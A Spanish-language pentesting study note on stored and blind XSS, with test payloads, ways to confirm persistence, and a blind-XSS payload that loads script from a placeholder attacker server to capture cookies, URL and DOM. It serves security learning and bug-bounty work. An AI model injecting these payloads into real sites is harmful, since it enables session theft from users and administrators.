---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - XSS
Descripción: "El Stored XSS (o Persistent XSS) ocurre cuando el payload inyectado se guarda en la base de datos del back-end y se recupera al visitar la página"
Fecha de actualización: 2026-06-02
Nota previa: "[[00 - Introducción a XSS]]"
Nota siguiente: "[[02 - XSS Reflejado]]"
Area: "[[XSS.base|XSS]]"
---
---

<mark style="background: #ADCCFFA6;">El `Stored XSS` (o `Persistent XSS`) ocurre cuando el payload inyectado se guarda en la base de datos del back-end y se recupera al visitar la página</mark>. Es el tipo más crítico: <mark style="background: #FFB86CA6;">al quedar almacenado, afecta a **cualquier** usuario que cargue la página</mark>, no solo a quien lo inyectó. Además es difícil de erradicar — hay que eliminar el payload del propio backend.

# Probar si una página es vulnerable

Sobre un campo que refleje la entrada (p. ej. una `To-Do List` que añade ítems), el payload de prueba estándar es:

```html
<script>alert(window.origin)</script>
```

Si la página no sanea la entrada, el `alert` salta —al inyectarlo o al refrescar— con la URL de la página. Confirmar en el código fuente (`CTRL+U`) que el payload se insertó tal cual:

```html
<ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script>
</ul></ul>
```

> [!important]+ Por qué `window.origin` y no `alert(1)`
> <mark style="background: #FFB8EBA6;">Muchas apps modernas manejan la entrada en `IFrames` de otro dominio</mark>, así que un formulario vulnerable podría no serlo en la aplicación principal. Mostrar `window.origin` en vez de un valor estático como `1` revela **en qué origen** se ejecuta el payload, confirmando cuál es el formulario realmente vulnerable cuando hay iframes de por medio.

# Cuando `alert()` está bloqueado

Algunos navegadores bloquean `alert()` en ciertos contextos. Conviene tener payloads alternativos de confirmación:

- `<plaintext>` — deja de renderizar el HTML posterior y lo muestra como texto plano (muy visible).
- `<script>print()</script>` — abre el diálogo de impresión; útil porque Chrome bloquea `alert`/`confirm`/`prompt` en *iframes* cross-origin pero no `print()` (aun así no es infalible: también puede bloquearse en *sandboxes* sin `allow-modals`). Lo más robusto para confirmar es exfiltrar a tu servidor (`fetch`/`new Image().src`).

Para verificar que es **almacenado** y no reflejado, refresca la página: si el `alert` vuelve a saltar en cada recarga (y a cualquier usuario que visite), es `Stored XSS` confirmado.

> [!important]+ Blind XSS: la variante almacenada más peligrosa
> Un caso especial de stored XSS es el <mark style="background: #FF5582A6;">`Blind XSS`: el payload se guarda y se ejecuta en un contexto que **tú no ves**</mark> —el panel del administrador, un visor de tickets de soporte, los logs internos, un sistema de gestión—. Inyectas en un campo (nombre, user-agent, dirección) y el payload dispara cuando un *empleado* abre ese registro en otra interfaz. Como no ves la ejecución, se usan payloads que "llaman a casa": `XSS Hunter` (self-hosted o `xsshunter.com`; el `xss.ht` original se descontinuó en 2023), `ezXSS` o un *collaborator* propio reciben una petición con cookies, URL y DOM cuando el payload se ejecuta donde sea. Es uno de los vectores más rentables en bug bounty porque alcanza paneles internos privilegiados:
> ```html
> <script src="https://TU_SERVIDOR_XSS"></script>
> ```

El siguiente tipo no persiste: se refleja en la respuesta inmediata. Es el [[02 - XSS Reflejado]].
